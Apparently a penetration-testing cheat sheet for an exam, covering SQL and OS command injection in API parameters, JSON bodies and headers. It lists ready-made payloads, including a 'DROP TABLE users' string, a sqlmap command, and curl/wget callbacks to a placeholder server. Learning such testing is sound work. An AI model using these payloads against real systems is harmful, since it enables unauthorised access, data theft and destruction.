## API — Injection

## 1. Testing for SQL Injection

### Objective
Inject SQL payloads through API parameters to:
- Dump data
- Bypass authentication
- Modify queries

---

### Where to test

- Query params:
```
/api/user?id=1
```

- JSON body:
```json
{"id": 1}
```

- Headers:
```
Authorization: Bearer ' OR 1=1--
```

- SOAP:
```xml
<id>1</id>
```

---

### Basic payloads

#### Authentication bypass
```sql
' OR 1=1--
" OR 1=1--
```

#### Error-based
```sql
'
"
'--
```

#### Boolean-based
```sql
1 AND 1=1
1 AND 1=2
```

---

### JSON-based injection

```json
{"id": "1 OR 1=1"}
{"username": "admin'--"}
```

---

### Blind SQLi (very common in APIs)

#### Boolean-based
Observe response difference:

```sql
1 AND 1=1  → normal response
1 AND 1=2  → empty / error
```

---

#### Time-based
```sql
1 OR SLEEP(5)
1; WAITFOR DELAY '0:0:5'
```

→ Delay = vulnerable

---

### Order / sort injection

```json
{"sort": "name; DROP TABLE users--"}
```

---

### Tools

- Burp Intruder (fuzz params)
- sqlmap (if allowed)

```bash
sqlmap -u "http://target/api?id=1" --batch
```

---

### What to look for

- SQL errors in response
- Response differences (true vs false)
- Time delays
- Unexpected data returned

---

### Common mistakes (good for you)

- No input sanitization
- Direct query concatenation
- Trusting JSON input as safe

---

## 2. Testing for Command Injection

### Objective
Execute OS commands via API inputs

---

### Where to test

- Parameters used in:
  - ping
  - nslookup
  - file operations
  - system utilities

Example:
```json
{"host": "127.0.0.1"}
```

---

### Basic payloads

#### Linux
```bash
; id
&& id
| id
```

#### Windows
```cmd
& whoami
&& whoami
```

---

### Example injection

```json
{"host": "127.0.0.1; id"}
```

---

### Blind command injection

#### Time-based

```bash
; sleep 5
&& timeout 5
```

→ Delay confirms execution

---

#### Out-of-band (OOB)

```bash
; curl http://your-server.com
; wget http://your-server.com
```

→ Check if request hits your server

---

### File-based proof

```bash
; touch /tmp/pwned
; echo test > /tmp/test.txt
```

---

### Encoding bypass

```bash
127.0.0.1%3Bid
127.0.0.1|id
127.0.0.1$(id)
```

---

### Common vulnerable patterns

- system()
- exec()
- popen()
- Shell calls with user input

---

### What to look for

- Command output in response
- Delayed responses
- External callbacks (OOB)
- Error messages

---

## Fast Workflow (Exam Mode)

1. Identify input points (params, JSON, headers)
2. Try basic payloads:
   - ' OR 1=1--
   - ; id
3. If nothing:
   - Boolean-based
   - Time-based
4. Compare responses carefully
5. Use Burp Intruder for fuzzing
6. Confirm with:
   - data leak
   - delay
   - OOB

---

## Mental Model

APIs trust structured data too much.

- JSON ≠ safe
- Types can be bypassed
- Backend often concatenates input

Your job:
→ Break assumptions → Force execution